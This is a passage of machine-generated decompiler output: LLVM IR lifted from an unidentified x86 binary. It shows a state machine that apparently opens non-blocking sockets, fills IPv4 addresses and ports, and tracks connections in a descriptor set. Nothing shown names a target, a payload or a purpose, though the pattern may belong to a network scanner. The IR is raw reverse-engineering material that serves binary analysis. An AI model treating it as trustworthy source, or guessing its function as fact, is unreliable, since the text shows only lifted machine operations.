dec_label_pc_8048537:                             ; preds = %dec_label_pc_80485b6
  %v10_8048537 = icmp eq i8 %v3_80485a5, 2
  store i1 %v10_8048537, i1* %zf.global-to-local, align 1
  br i1 %v10_8048537, label %dec_label_pc_8048c9d, label %dec_label_pc_804853f

dec_label_pc_804853f:                             ; preds = %dec_label_pc_8048537
  %v10_804853f = icmp eq i8 %v3_80485a5, 4
  store i1 %v10_804853f, i1* %zf.global-to-local, align 1
  br i1 %v10_804853f, label %dec_label_pc_8048700, label %dec_label_pc_8048547

dec_label_pc_8048547:                             ; preds = %dec_label_pc_804853f
  %v10_8048547 = icmp eq i8 %v3_80485a5, 6
  store i1 %v10_8048547, i1* %zf.global-to-local, align 1
  br i1 %v10_8048547, label %dec_label_pc_80493a7, label %dec_label_pc_804854f

dec_label_pc_804854f:                             ; preds = %dec_label_pc_8048547
  %v10_804854f = icmp eq i8 %v3_80485a5, 7
  store i1 %v10_804854f, i1* %zf.global-to-local, align 1
  br i1 %v10_804854f, label %dec_label_pc_8049773, label %dec_label_pc_8048557

dec_label_pc_8048557:                             ; preds = %dec_label_pc_804854f
  %v10_8048557 = icmp eq i8 %v3_80485a5, 10
  store i1 %v10_8048557, i1* %zf.global-to-local, align 1
  br i1 %v10_8048557, label %dec_label_pc_8049829, label %dec_label_pc_8048557.dec_label_pc_804855f_crit_edge

dec_label_pc_8048557.dec_label_pc_804855f_crit_edge: ; preds = %dec_label_pc_8048557
  %v0_804855f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804855f

dec_label_pc_804855f:                             ; preds = %dec_label_pc_8048557.dec_label_pc_804855f_crit_edge, %dec_label_pc_8048c9d
  %v0_804855f = phi i32 [ %v0_804855f.pre, %dec_label_pc_8048557.dec_label_pc_804855f_crit_edge ], [ %v0_8048c9d, %dec_label_pc_8048c9d ]
  %v9_804855f = icmp eq i32 %v0_804855f, 12
  store i1 %v9_804855f, i1* %zf.global-to-local, align 1
  %v1_8048562 = add i32 %v0_80485a5, -1440
  %v2_8048562 = inttoptr i32 %v1_8048562 to i32*
  %v3_8048562 = load i32, i32* %v2_8048562, align 4
  store i32 %v3_8048562, i32* %edx.global-to-local, align 4
  store i8 0, i8* %v2_80485a5, align 1
  %v0_804856f = load i32, i32* %edx.global-to-local, align 4
  %v1_804856f = load i32, i32* @esp, align 4
  %v2_804856f = add i32 %v1_804856f, -4
  %v3_804856f = inttoptr i32 %v2_804856f to i32*
  store i32 %v0_804856f, i32* %v3_804856f, align 4
  %v1_8048570 = call i32 @function_8052b81(i32 %stack_var_-20924.0.ph)
  store i32 %v1_8048570, i32* %eax.global-to-local, align 4
  %v0_8048575 = load i32, i32* @esi, align 4
  %v1_8048575 = add i32 %v0_8048575, -1440
  %v2_8048575 = inttoptr i32 %v1_8048575 to i32*
  store i32 -1, i32* %v2_8048575, align 4
  %v0_804857f = load i32, i32* @esp, align 4
  %v6_804857f = icmp eq i32 %v0_804857f, -16
  store i1 %v6_804857f, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048582

dec_label_pc_8048582:                             ; preds = %dec_label_pc_8049829, %dec_label_pc_8049773, %dec_label_pc_80493a7, %dec_label_pc_8048cb2, %dec_label_pc_8048c28, %dec_label_pc_8048601, %dec_label_pc_804861f, %dec_label_pc_80486e4, %dec_label_pc_804855f
  %v0_8048582 = load i32, i32* @esp, align 4
  %v1_8048582 = add i32 %v0_8048582, 100
  %v2_8048582 = inttoptr i32 %v1_8048582 to i32*
  %v3_8048582 = load i32, i32* %v2_8048582, align 4
  %v0_8048586 = load i32, i32* @ebp, align 4
  %v1_8048586 = add i32 %v0_8048586, 3140
  store i32 %v1_8048586, i32* @ebp, align 4
  %v1_804858c = add i32 %v3_8048582, 1
  store i32 %v1_804858c, i32* %eax.global-to-local, align 4
  %v0_804858d = load i32, i32* @esi, align 4
  %v1_804858d = add i32 %v0_804858d, 3140
  store i32 %v1_804858d, i32* @esi, align 4
  store i32 %v1_804858c, i32* %v2_8048582, align 4
  %v0_8048597 = load i32, i32* @esp, align 4
  %v1_8048597 = add i32 %v0_8048597, 100
  %v2_8048597 = inttoptr i32 %v1_8048597 to i32*
  %v3_8048597 = load i32, i32* %v2_8048597, align 4
  store i32 %v3_8048597, i32* @ecx, align 4
  %v1_804859b = add i32 %v0_8048597, 112
  %v2_804859b = inttoptr i32 %v1_804859b to i32*
  %v3_804859b = load i32, i32* %v2_804859b, align 4
  %v15_804859b = icmp eq i32 %v3_804859b, %v3_8048597
  store i1 %v15_804859b, i1* %zf.global-to-local, align 1
  br i1 %v15_804859b, label %dec_label_pc_8048cdd, label %dec_label_pc_80485a5

dec_label_pc_80485a5:                             ; preds = %dec_label_pc_8048582, %dec_label_pc_8048517
  %v0_80485a5 = load i32, i32* @esi, align 4
  %v1_80485a5 = add i32 %v0_80485a5, -1436
  %v2_80485a5 = inttoptr i32 %v1_80485a5 to i8*
  %v3_80485a5 = load i8, i8* %v2_80485a5, align 1
  %v4_80485a5 = zext i8 %v3_80485a5 to i32
  %v5_80485a5 = load i32, i32* %eax.global-to-local, align 4
  %v6_80485a5 = and i32 %v5_80485a5, -256
  %v7_80485a5 = or i32 %v6_80485a5, %v4_80485a5
  store i32 %v7_80485a5, i32* %eax.global-to-local, align 4
  %v0_80485ab = load i32, i32* @ebp, align 4
  %v1_80485ab = add i32 %v0_80485ab, -16
  store i32 %v1_80485ab, i32* @edi, align 4
  %v6_80485ae = icmp eq i8 %v3_80485a5, 0
  %v10_80485ae = icmp eq i8 %v3_80485a5, 1
  store i1 %v10_80485ae, i1* %zf.global-to-local, align 1
  br i1 %v10_80485ae, label %dec_label_pc_80486ee, label %dec_label_pc_80485b6

dec_label_pc_80485b6:                             ; preds = %dec_label_pc_80485a5
  store i1 %v6_80485ae, i1* %zf.global-to-local, align 1
  %v1_80485b8 = icmp eq i1 %v6_80485ae, false
  br i1 %v1_80485b8, label %dec_label_pc_8048537, label %dec_label_pc_80485be

dec_label_pc_80485be:                             ; preds = %dec_label_pc_80485b6, %dec_label_pc_8048c91
  %v0_80485be = load i32, i32* @esp, align 4
  %v1_80485be = add i32 %v0_80485be, 20868
  %v2_80485be = inttoptr i32 %v1_80485be to i32*
  store i32 0, i32* %v2_80485be, align 4
  %v0_80485c9 = load i32, i32* @esp, align 4
  %v1_80485c9 = add i32 %v0_80485c9, 20872
  %v2_80485c9 = inttoptr i32 %v1_80485c9 to i32*
  store i32 0, i32* %v2_80485c9, align 4
  %v0_80485d4 = load i32, i32* @esp, align 4
  %v1_80485d4 = add i32 %v0_80485d4, 20876
  %v2_80485d4 = inttoptr i32 %v1_80485d4 to i32*
  store i32 0, i32* %v2_80485d4, align 4
  %v0_80485df = load i32, i32* @esp, align 4
  %v1_80485df = add i32 %v0_80485df, 20880
  %v2_80485df = inttoptr i32 %v1_80485df to i32*
  store i32 0, i32* %v2_80485df, align 4
  %v0_80485ea = load i32, i32* @esi, align 4
  %v1_80485ea = add i32 %v0_80485ea, -1440
  %v2_80485ea = inttoptr i32 %v1_80485ea to i32*
  %v3_80485ea = load i32, i32* %v2_80485ea, align 4
  store i32 %v3_80485ea, i32* %eax.global-to-local, align 4
  %v10_80485f0 = icmp eq i32 %v3_80485ea, -1
  store i1 %v10_80485f0, i1* %zf.global-to-local, align 1
  %v1_8048601.pre = load i32, i32* @esp, align 4
  br i1 %v10_80485f0, label %dec_label_pc_8048601, label %dec_label_pc_80485f5

dec_label_pc_80485f5:                             ; preds = %dec_label_pc_80485be
  %v9_80485f5 = icmp eq i32 %v1_8048601.pre, 12
  store i1 %v9_80485f5, i1* %zf.global-to-local, align 1
  %v2_80485f8 = add i32 %v1_8048601.pre, -16
  %v3_80485f8 = inttoptr i32 %v2_80485f8 to i32*
  store i32 %v3_80485ea, i32* %v3_80485f8, align 4
  %v1_80485f9 = call i32 @function_8052b81(i32 %stack_var_-20924.0.ph)
  store i32 %v1_80485f9, i32* %eax.global-to-local, align 4
  %v0_80485fe = load i32, i32* @esp, align 4
  %v1_80485fe = add i32 %v0_80485fe, 16
  %v6_80485fe = icmp eq i32 %v1_80485fe, 0
  store i1 %v6_80485fe, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048601

dec_label_pc_8048601:                             ; preds = %dec_label_pc_80485be, %dec_label_pc_80485f5
  %v1_8048601 = phi i32 [ %v1_80485fe, %dec_label_pc_80485f5 ], [ %v1_8048601.pre, %dec_label_pc_80485be ]
  %v0_8048601 = load i32, i32* @ecx, align 4
  %v2_8048601 = add i32 %v1_8048601, -4
  %v3_8048601 = inttoptr i32 %v2_8048601 to i32*
  store i32 %v0_8048601, i32* %v3_8048601, align 4
  %v1_8048602 = add i32 %v1_8048601, -8
  %v2_8048602 = inttoptr i32 %v1_8048602 to i32*
  store i32 0, i32* %v2_8048602, align 4
  %v1_8048604 = add i32 %v1_8048601, -12
  %v2_8048604 = inttoptr i32 %v1_8048604 to i32*
  store i32 1, i32* %v2_8048604, align 4
  %v1_8048606 = add i32 %v1_8048601, -16
  %v2_8048606 = inttoptr i32 %v1_8048606 to i32*
  store i32 2, i32* %v2_8048606, align 4
  %v3_8048608 = call i32 @function_8053375(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048608, i32* %eax.global-to-local, align 4
  %v1_8048610 = load i32, i32* @esi, align 4
  %v2_8048610 = add i32 %v1_8048610, -1440
  %v3_8048610 = inttoptr i32 %v2_8048610 to i32*
  store i32 %v3_8048608, i32* %v3_8048610, align 4
  %v10_8048616 = icmp eq i32 %v3_8048608, -1
  store i1 %v10_8048616, i1* %zf.global-to-local, align 1
  br i1 %v10_8048616, label %dec_label_pc_8048582, label %dec_label_pc_804861f

dec_label_pc_804861f:                             ; preds = %dec_label_pc_8048601
  %v0_804861f = load i32, i32* @edx, align 4
  %v1_804861f = load i32, i32* @esp, align 4
  %v2_804861f = add i32 %v1_804861f, -4
  %v3_804861f = inttoptr i32 %v2_804861f to i32*
  store i32 %v0_804861f, i32* %v3_804861f, align 4
  %v1_8048620 = add i32 %v1_804861f, -8
  %v2_8048620 = inttoptr i32 %v1_8048620 to i32*
  store i32 0, i32* %v2_8048620, align 4
  %v1_8048622 = add i32 %v1_804861f, -12
  %v2_8048622 = inttoptr i32 %v1_8048622 to i32*
  store i32 3, i32* %v2_8048622, align 4
  %v2_8048624 = add i32 %v1_804861f, -16
  %v3_8048624 = inttoptr i32 %v2_8048624 to i32*
  store i32 %v3_8048608, i32* %v3_8048624, align 4
  %v3_8048625 = call i32 @function_8052abd(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804862a = load i32, i32* @esp, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  %v12_804862d = or i32 %v3_8048625, 2048
  store i32 %v12_804862d, i32* %eax.global-to-local, align 4
  %v2_8048630 = add i32 %v0_804862a, 8
  %v3_8048630 = inttoptr i32 %v2_8048630 to i32*
  store i32 %v12_804862d, i32* %v3_8048630, align 4
  %v1_8048631 = add i32 %v0_804862a, 4
  %v2_8048631 = inttoptr i32 %v1_8048631 to i32*
  store i32 4, i32* %v2_8048631, align 4
  %v0_8048633 = load i32, i32* @esi, align 4
  %v1_8048633 = add i32 %v0_8048633, -1440
  %v2_8048633 = inttoptr i32 %v1_8048633 to i32*
  %v3_8048633 = load i32, i32* %v2_8048633, align 4
  store i32 %v3_8048633, i32* %eax.global-to-local, align 4
  %v3_8048639 = inttoptr i32 %v0_804862a to i32*
  store i32 %v3_8048633, i32* %v3_8048639, align 4
  %v3_804863a = call i32 @function_8052abd(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804863f = load i32, i32* @esp, align 4
  %v1_804863f = add i32 %v0_804863f, 20916
  store i32 %v1_804863f, i32* %eax.global-to-local, align 4
  %v2_8048646 = inttoptr i32 %v1_804863f to i32*
  store i32 65535, i32* %v2_8048646, align 4
  %v0_8048651 = load i32, i32* @esp, align 4
  %v1_8048651 = inttoptr i32 %v0_8048651 to i32*
  store i32 4, i32* %v1_8048651, align 4
  %v0_8048658 = load i32, i32* %eax.global-to-local, align 4
  %v1_8048658 = load i32, i32* @esp, align 4
  %v2_8048658 = add i32 %v1_8048658, -4
  %v3_8048658 = inttoptr i32 %v2_8048658 to i32*
  store i32 %v0_8048658, i32* %v3_8048658, align 4
  %v1_8048659 = add i32 %v1_8048658, -8
  %v2_8048659 = inttoptr i32 %v1_8048659 to i32*
  store i32 8, i32* %v2_8048659, align 4
  %v1_804865b = add i32 %v1_8048658, -12
  %v2_804865b = inttoptr i32 %v1_804865b to i32*
  store i32 0, i32* %v2_804865b, align 4
  %v0_804865d = load i32, i32* @esi, align 4
  %v1_804865d = add i32 %v0_804865d, -1440
  %v2_804865d = inttoptr i32 %v1_804865d to i32*
  %v3_804865d = load i32, i32* %v2_804865d, align 4
  store i32 %v3_804865d, i32* %eax.global-to-local, align 4
  %v2_8048663 = add i32 %v1_8048658, -16
  %v3_8048663 = inttoptr i32 %v2_8048663 to i32*
  store i32 %v3_804865d, i32* %v3_8048663, align 4
  %v5_8048664 = call i32 @function_805333a(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8048664, i32* %eax.global-to-local, align 4
  %v0_8048669 = load i32, i32* @esi, align 4
  %v1_8048669 = add i32 %v0_8048669, -1424
  %v2_8048669 = inttoptr i32 %v1_8048669 to i32*
  %v3_8048669 = load i32, i32* %v2_8048669, align 4
  store i32 %v3_8048669, i32* %eax.global-to-local, align 4
  %v0_804866f = load i32, i32* @esp, align 4
  %v1_804866f = add i32 %v0_804866f, 112
  %v2_804866f = inttoptr i32 %v1_804866f to i32*
  %v3_804866f = load i32, i32* %v2_804866f, align 4
  store i32 %v3_804866f, i32* %edx.global-to-local, align 4
  %v2_8048673 = add i32 %v0_804866f, 20904
  %v3_8048673 = inttoptr i32 %v2_8048673 to i32*
  store i32 %v3_8048669, i32* %v3_8048673, align 4
  %v0_804867a = load i32, i32* @esp, align 4
  %v1_804867a = add i32 %v0_804867a, 20900
  %v2_804867a = inttoptr i32 %v1_804867a to i16*
  store i16 2, i16* %v2_804867a, align 2
  %v0_8048684 = load i32, i32* @esp, align 4
  %v1_8048684 = add i32 %v0_8048684, 102
  %v2_8048684 = inttoptr i32 %v1_8048684 to i16*
  %v3_8048684 = load i16, i16* %v2_8048684, align 2
  %v5_8048684 = load i32, i32* %eax.global-to-local, align 4
  %v6_8048684 = and i32 %v5_8048684, -65536
  %v0_8048689 = load i32, i32* %edx.global-to-local, align 4
  %v1_8048689 = load i32, i32* @esi, align 4
  %v2_8048689 = add i32 %v1_8048689, -1432
  %v3_8048689 = inttoptr i32 %v2_8048689 to i32*
  store i32 %v0_8048689, i32* %v3_8048689, align 4
  %v2_804868f = call i16 @llvm.bswap.i16(i16 %v3_8048684)
  %v3_804868f = zext i16 %v2_804868f to i32
  %v6_804868f = or i32 %v3_804868f, %v6_8048684
  store i32 %v6_804868f, i32* %eax.global-to-local, align 4
  %v2_8048693 = load i32, i32* @esp, align 4
  %v3_8048693 = add i32 %v2_8048693, 20902
  %v4_8048693 = inttoptr i32 %v3_8048693 to i16*
  store i16 %v2_804868f, i16* %v4_8048693, align 2
  %v0_804869b = load i32, i32* @esp, align 4
  %v9_804869b = icmp eq i32 %v0_804869b, -28
  store i1 %v9_804869b, i1* %zf.global-to-local, align 1
  %v0_804869e = load i32, i32* @esi, align 4
  %v1_804869e = add i32 %v0_804869e, -1436
  %v2_804869e = inttoptr i32 %v1_804869e to i8*
  store i8 2, i8* %v2_804869e, align 1
  %v0_80486a5 = load i32, i32* @esp, align 4
  %v1_80486a5 = add i32 %v0_80486a5, -4
  %v2_80486a5 = inttoptr i32 %v1_80486a5 to i32*
  store i32 16, i32* %v2_80486a5, align 4
  %v1_80486a7 = add i32 %v0_80486a5, 20872
  store i32 %v1_80486a7, i32* %ecx.global-to-local, align 4
  %v2_80486ae = add i32 %v0_80486a5, -8
  %v3_80486ae = inttoptr i32 %v2_80486ae to i32*
  store i32 %v1_80486a7, i32* %v3_80486ae, align 4
  %v0_80486af = load i32, i32* @esi, align 4
  %v1_80486af = add i32 %v0_80486af, -1440
  %v2_80486af = inttoptr i32 %v1_80486af to i32*
  %v3_80486af = load i32, i32* %v2_80486af, align 4
  store i32 %v3_80486af, i32* @edi, align 4
  %v2_80486b5 = add i32 %v0_80486a5, -12
  %v3_80486b5 = inttoptr i32 %v2_80486b5 to i32*
  store i32 %v3_80486af, i32* %v3_80486b5, align 4
  %v3_80486b6 = call i32 @function_805319a(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80486b6, i32* %eax.global-to-local, align 4
  %v0_80486bb = load i32, i32* @esi, align 4
  %v1_80486bb = add i32 %v0_80486bb, -1440
  %v2_80486bb = inttoptr i32 %v1_80486bb to i32*
  %v3_80486bb = load i32, i32* %v2_80486bb, align 4
  %v1_80486c3 = urem i32 %v3_80486bb, 32
  store i32 %v1_80486c3, i32* %eax.global-to-local, align 4
  %v2_80486c6 = udiv i32 %v3_80486bb, 32
  store i32 %v2_80486c6, i32* %edx.global-to-local, align 4
  %v0_80486c9 = load i32, i32* @esp, align 4
  %v2_80486c9 = mul nuw nsw i32 %v2_80486c6, 4
  %v3_80486c9 = add nuw nsw i32 %v2_80486c9, 20628
  %v4_80486c9 = add i32 %v3_80486c9, %v0_80486c9
  %v5_80486c9 = inttoptr i32 %v4_80486c9 to i32*
  %v6_80486c9 = load i32, i32* %v5_80486c9, align 4
  %v9_80486c9 = shl i32 1, %v1_80486c3
  %v12_80486c9 = or i32 %v6_80486c9, %v9_80486c9
  store i32 %v12_80486c9, i32* %v5_80486c9, align 4
  %v0_80486d1 = load i32, i32* @esp, align 4
  %v1_80486d1 = add i32 %v0_80486d1, 16
  %v0_80486d4 = load i32, i32* @esi, align 4
  %v1_80486d4 = add i32 %v0_80486d4, -1440
  %v2_80486d4 = inttoptr i32 %v1_80486d4 to i32*
  %v3_80486d4 = load i32, i32* %v2_80486d4, align 4
  store i32 %v3_80486d4, i32* %eax.global-to-local, align 4
  %v1_80486da = add i32 %v0_80486d1, 88
  %v2_80486da = inttoptr i32 %v1_80486da to i32*
  %v3_80486da = load i32, i32* %v2_80486da, align 4
  %v5_80486da = sub i32 %v3_80486da, %v3_80486d4
  %v11_80486da = xor i32 %v3_80486da, %v3_80486d4
  %v12_80486da = xor i32 %v5_80486da, %v3_80486da
  %v13_80486da = and i32 %v12_80486da, %v11_80486da
  %v14_80486da = icmp slt i32 %v13_80486da, 0
  %v15_80486da = icmp eq i32 %v5_80486da, 0
  store i1 %v15_80486da, i1* %zf.global-to-local, align 1
  %v16_80486da = icmp slt i32 %v5_80486da, 0
  %v2_80486de = icmp eq i1 %v16_80486da, %v14_80486da
  br i1 %v2_80486de, label %dec_label_pc_8048582, label %dec_label_pc_80486e4

dec_label_pc_80486e4:                             ; preds = %dec_label_pc_8049829, %dec_label_pc_8049773, %dec_label_pc_80493a7, %dec_label_pc_8048cb2, %dec_label_pc_8048c28, %dec_label_pc_804861f
  %v1_80486e5 = phi i32 [ %v1_8049845, %dec_label_pc_8049829 ], [ %v1_804978f, %dec_label_pc_8049773 ], [ %v1_80493c3, %dec_label_pc_80493a7 ], [ %v0_8048cce, %dec_label_pc_8048cb2 ], [ %v1_8048c79, %dec_label_pc_8048c28 ], [ %v1_80486d1, %dec_label_pc_804861f ]
  %v0_80486e4 = phi i32 [ %v3_804983f, %dec_label_pc_8049829 ], [ %v3_8049789, %dec_label_pc_8049773 ], [ %v3_80493bd, %dec_label_pc_80493a7 ], [ %v3_8048cc8, %dec_label_pc_8048cb2 ], [ %v3_8048c7c, %dec_label_pc_8048c28 ], [ %v3_80486d4, %dec_label_pc_804861f ]
  %v1_80486e4 = add i32 %v0_80486e4, 1
  %v8_80486e4 = icmp eq i32 %v1_80486e4, 0
  store i1 %v8_80486e4, i1* %zf.global-to-local, align 1
  store i32 %v1_80486e4, i32* %eax.global-to-local, align 4
  %v2_80486e5 = add i32 %v1_80486e5, 72
  %v3_80486e5 = inttoptr i32 %v2_80486e5 to i32*
  store i32 %v1_80486e4, i32* %v3_80486e5, align 4
  br label %dec_label_pc_8048582

dec_label_pc_80486ee:                             ; preds = %dec_label_pc_80485a5
  %v1_80486ee = add i32 %v0_80485a5, 16
  %v2_80486ee = inttoptr i32 %v1_80486ee to i32*
  %v3_80486ee = load i32, i32* %v2_80486ee, align 4
  store i32 %v3_80486ee, i32* @ebx, align 4
  %v1_80486f1 = icmp eq i32 %v3_80486ee, 0
  store i1 %v1_80486f1, i1* %zf.global-to-local, align 1
  br i1 %v1_80486f1, label %dec_label_pc_8048c91, label %dec_label_pc_80486f9

dec_label_pc_80486f9:                             ; preds = %dec_label_pc_80486ee
  store i8 4, i8* %v2_80485a5, align 1
  %v0_8048700.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8048700

dec_label_pc_8048700:                             ; preds = %dec_label_pc_804853f, %dec_label_pc_80486f9
  %v0_8048700 = phi i32 [ %v0_80485a5, %dec_label_pc_804853f ], [ %v0_8048700.pre, %dec_label_pc_80486f9 ]
  %v1_8048700 = add i32 %v0_8048700, 24
  %v2_8048700 = inttoptr i32 %v1_8048700 to i32*
  store i32 -1, i32* %v2_8048700, align 4
  %v0_8048707 = load i32, i32* @esi, align 4
  %v1_8048707 = add i32 %v0_8048707, 12
  %v2_8048707 = inttoptr i32 %v1_8048707 to i32*
  store i32 0, i32* %v2_8048707, align 4
  %v0_804870e = load i32, i32* @edi, align 4
  %v1_804870e = add i32 %v0_804870e, 2116
  store i32 %v1_804870e, i32* @eax, align 4
  %v0_8048714 = load i32, i32* @ecx, align 4
  %v1_8048714 = load i32, i32* @esp, align 4
  %v2_8048714 = add i32 %v1_8048714, -4
  %v3_8048714 = inttoptr i32 %v2_8048714 to i32*
  store i32 %v0_8048714, i32* %v3_8048714, align 4
  %v0_8048715 = load i32, i32* @ecx, align 4
  %v2_8048715 = add i32 %v1_8048714, -8
  %v3_8048715 = inttoptr i32 %v2_8048715 to i32*
  store i32 %v0_8048715, i32* %v3_8048715, align 4
  %v1_8048716 = add i32 %v1_8048714, -12
  %v2_8048716 = inttoptr i32 %v1_8048716 to i32*
  store i32 1024, i32* %v2_8048716, align 4
  %v0_804871b = load i32, i32* @eax, align 4
  %v2_804871b = add i32 %v1_8048714, -16
  %v3_804871b = inttoptr i32 %v2_804871b to i32*
  store i32 %v0_804871b, i32* %v3_804871b, align 4
  %v2_804871c = call i32 @function_8052670(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804871c, i32* %eax.global-to-local, align 4
  %v0_8048721 = load i32, i32* @esi, align 4
  %v1_8048721 = add i32 %v0_8048721, 672
  %v2_8048721 = inttoptr i32 %v1_8048721 to i32*
  store i32 0, i32* %v2_8048721, align 4
  %v0_804872b = load i32, i32* @esp, align 4
  %v1_804872b = inttoptr i32 %v0_804872b to i32*
  %v2_804872b = load i32, i32* %v1_804872b, align 4
  store i32 %v2_804872b, i32* %eax.global-to-local, align 4
  %v3_804872b = add i32 %v0_804872b, 4
  %v1_804872c = inttoptr i32 %v3_804872b to i32*
  %v2_804872c = load i32, i32* %v1_804872c, align 4
  store i32 %v2_804872c, i32* %edx.global-to-local, align 4
  store i32 10240, i32* %v1_804872c, align 4
  %v1_8048732 = add i32 %v0_804872b, 10388
  store i32 %v1_8048732, i32* @eax, align 4
  store i32 %v1_8048732, i32* %v1_804872b, align 4
  %v2_804873a = call i32 @function_8052670(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804873a, i32* %eax.global-to-local, align 4
  %v0_804873f = load i32, i32* @edi, align 4
  %v1_804873f = add i32 %v0_804873f, 1431
  store i32 %v1_804873f, i32* %edx.global-to-local, align 4
  %v1_8048745 = load i32, i32* @esp, align 4
  %v2_8048745 = add i32 %v1_8048745, 112
  %v3_8048745 = inttoptr i32 %v2_8048745 to i32*
  store i32 %v1_804873f, i32* %v3_8048745, align 4
  %v0_8048749 = load i32, i32* @esp, align 4
  %v1_8048749 = inttoptr i32 %v0_8048749 to i32*
  %v2_8048749 = load i32, i32* %v1_8048749, align 4
  store i32 %v2_8048749, i32* %eax.global-to-local, align 4
  %v1_804874a = add i32 %v0_8048749, 10388
  store i32 %v1_804874a, i32* %ecx.global-to-local, align 4
  store i32 %v1_804874a, i32* %v1_8048749, align 4
  %v2_8048752 = call i32 @function_80525e0(i8* %v1_8048752)
  store i32 %v2_8048752, i32* %eax.global-to-local, align 4
  %v0_8048757 = load i32, i32* @esp, align 4
  %v1_8048757 = inttoptr i32 %v0_8048757 to i32*
  %v2_8048757 = load i32, i32* %v1_8048757, align 4
  store i32 %v2_8048757, i32* %ecx.global-to-local, align 4
  %v3_8048757 = add i32 %v0_8048757, 4
  %v1_8048758 = inttoptr i32 %v3_8048757 to i32*
  %v2_8048758 = load i32, i32* %v1_8048758, align 4
  store i32 %v2_8048758, i32* @ebx, align 4
  %v1_8048759 = add i32 %v0_8048757, 112
  %v2_8048759 = inttoptr i32 %v1_8048759 to i32*
  %v3_8048759 = load i32, i32* %v2_8048759, align 4
  store i32 %v3_8048759, i32* %v1_8048758, align 4
  %v1_804875e = add i32 %v0_8048757, 10388
  store i32 %v1_804875e, i32* %edx.global-to-local, align 4
  %v2_8048765 = add i32 %v1_804875e, %v2_8048752
  store i32 %v2_8048765, i32* %eax.global-to-local, align 4
  store i32 %v2_8048765, i32* %v1_8048757, align 4
  %v3_8048769 = call i32 @function_8052600(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048769, i32* %eax.global-to-local, align 4
  %v0_804876e = load i32, i32* @esp, align 4
  %v1_804876e = inttoptr i32 %v0_804876e to i32*
  %v2_804876e = load i32, i32* %v1_804876e, align 4
  store i32 %v2_804876e, i32* @ebx, align 4
  %v1_804876f = add i32 %v0_804876e, 10388
  store i32 %v1_804876f, i32* %ecx.global-to-local, align 4
  store i32 %v1_804876f, i32* %v1_804876e, align 4
  %v2_8048777 = call i32 @function_80525e0(i8* %v1_8048752)
  store i32 %v2_8048777, i32* %eax.global-to-local, align 4
  %v0_804877c = load i32, i32* @esp, align 4
  %v1_804877c = inttoptr i32 %v0_804877c to i32*
  %v2_804877c = load i32, i32* %v1_804877c, align 4
  store i32 %v2_804877c, i32* %edx.global-to-local, align 4
  %v3_804877c = add i32 %v0_804877c, 4
  %v1_804877d = inttoptr i32 %v3_804877c to i32*
  %v2_804877d = load i32, i32* %v1_804877d, align 4
  store i32 %v2_804877d, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805549f.7 to i32), i32* %v1_804877d, align 4
  %v1_8048783 = add i32 %v0_804877c, 10388
  store i32 %v1_8048783, i32* %edx.global-to-local, align 4
  %v2_804878a = add i32 %v1_8048783, %v2_8048777
  store i32 %v2_804878a, i32* %eax.global-to-local, align 4
  store i32 %v2_804878a, i32* %v1_804877c, align 4
  %v3_804878e = call i32 @function_8052600(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804878e, i32* %eax.global-to-local, align 4
  %v0_8048793 = load i32, i32* @esp, align 4
  %v1_8048793 = inttoptr i32 %v0_8048793 to i32*
  %v2_8048793 = load i32, i32* %v1_8048793, align 4
  store i32 %v2_8048793, i32* @ebx, align 4
  %v1_8048794 = add i32 %v0_8048793, 10388
  store i32 %v1_8048794, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048794, i32* %v1_8048793, align 4
  %v2_804879c = call i32 @function_80525e0(i8* %v1_8048752)
  store i32 %v2_804879c, i32* %eax.global-to-local, align 4
  %v0_80487a1 = load i32, i32* @esp, align 4
  %v1_80487a1 = inttoptr i32 %v0_80487a1 to i32*
  %v3_80487a1 = add i32 %v0_80487a1, 4
  %v0_80487a2 = load i32, i32* @edi, align 4
  %v1_80487a2 = add i32 %v0_80487a2, 532
  store i32 %v1_80487a2, i32* %edx.global-to-local, align 4
  %v1_80487a8 = inttoptr i32 %v3_80487a1 to i32*
  %v2_80487a8 = load i32, i32* %v1_80487a8, align 4
  store i32 %v2_80487a8, i32* %ecx.global-to-local, align 4
  store i32 %v1_80487a2, i32* %v1_80487a8, align 4
  %v1_80487aa = add i32 %v0_80487a1, 10388
  store i32 %v1_80487aa, i32* %edx.global-to-local, align 4
  %v2_80487b1 = add i32 %v1_80487aa, %v2_804879c
  store i32 %v2_80487b1, i32* %eax.global-to-local, align 4
  store i32 %v2_80487b1, i32* %v1_80487a1, align 4
  %v3_80487b5 = call i32 @function_8052600(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80487b5, i32* %eax.global-to-local, align 4
  %v0_80487ba = load i32, i32* @esp, align 4
  %v1_80487ba = inttoptr i32 %v0_80487ba to i32*
  %v2_80487ba = load i32, i32* %v1_80487ba, align 4
  store i32 %v2_80487ba, i32* @ebx, align 4
  %v1_80487bb = add i32 %v0_80487ba, 10388
  store i32 %v1_80487bb, i32* %ecx.global-to-local, align 4
  store i32 %v1_80487bb, i32* %v1_80487ba, align 4
  %v2_80487c3 = call i32 @function_80525e0(i8* %v1_8048752)
  store i32 %v2_80487c3, i32* %eax.global-to-local, align 4
  %v0_80487c8 = load i32, i32* @esp, align 4
